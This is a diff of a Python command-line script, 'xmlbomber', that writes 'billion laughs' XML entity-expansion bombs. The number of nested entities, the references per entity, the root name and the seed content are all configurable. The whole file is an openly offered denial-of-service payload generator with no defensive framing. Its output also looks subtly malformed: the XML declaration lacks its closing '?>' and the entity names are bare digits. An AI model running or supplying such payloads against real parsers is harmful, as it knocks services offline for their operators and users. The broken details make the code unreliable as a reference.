@@ -1,45 +1,33 @@
 #!/usr/bin/python3
 import sys
-i = 0
-j = i - 1
+import argparse
 
-def xml(i, j):
-    projname = input('Project name: ')
-    while True:
-        try:
-            amouent = int(input('Amount of Entities: '))
-            break
-        except:
-            print('Could not convert it...make sure you only type integers.')
-    while True:
-        try:
-            refent = int(input('Amount of References: '))
-            break
-        except:
-            print('Could not convert it...make sure you only type integers.')
+def xmlbomb(ents, refs, name, content):
+	i = 0
+	j = i - 1
+	sys.stdout.write('<?xml version="1.0">\n')
+	sys.stdout.write('<!DOCTYPE ' + name + ' [\n')
+	sys.stdout.write('  <!ENTITY 0 "' + content + '">\n')
+	for _ in range(ents):
+		i += 1
+		j = i - 1
+		sys.stdout.write('  <!ENTITY ' + str(i) + ' "')
+		for _ in range(refs):
+			sys.stdout.write(r'&' + str(j) + ';')
+		sys.stdout.write('">\n')
+	sys.stdout.write('  <!ENTITY start "&' + str(j) + ';">\n')
+	sys.stdout.write(']>\n')
+	sys.stdout.write('<' + name + '>&start;</' + name + '>')
+	return
 
-    file = projname + r'.xml'
-    fx = open(file, 'w')
-    fx.write('<?xml version="1.0">\n')
-    fx.write('<!DOCTYPE ' + projname + ' [\n')
-    fx.write('  <!ENTITY 0 "ABCDEFGHIJKLMNOPQRSTUVWXYZ">\n')
-    for _ in range(amouent):
-        i = i + 1
-        j = i - 1
-        i_str = str(i)
-        j_str = str(j)
-        fx.write('  <!ENTITY ' + i_str + ' "')
-        for _ in range(refent):
-            fx.write(r'&' + j_str + ';')
-        fx.write('">\n')
-    fx.write('  <!ENTITY start "&' + j_str + ';">\n')
-    fx.write(']>\n')
-    fx.write('<' + projname + '>&start;</' + projname + '>')
-    fx.close()
+def main():
+	parser = argparse.ArgumentParser(description="xmlbomber", epilog="Created by InkPrism (Original by https://github.com/lp0-on-fire)")
+	parser.add_argument("-e", "--entity", type=int, help="amount of entities (default: 10)", default=10)
+	parser.add_argument("-r", "--reference", type=int, help="amount of references (default: 10)", default=10)
+	parser.add_argument("-n", "--name", help="name (default: lol)", default="lol")
+	parser.add_argument("-c", "--content", help="content of first entity (default: lol)", default="lol")
+	args, unknown = parser.parse_known_args()
+	xmlbomb(args.entity, args.reference, args.name, args.content)
 
-while True:
-    xml(i , j)
-    ex = input('Continue? (Yes/no) (AnyKey/n): ')
-    if ex == 'n':
-        sys.exit(0)
-        
+if __name__ == '__main__':
+	main()
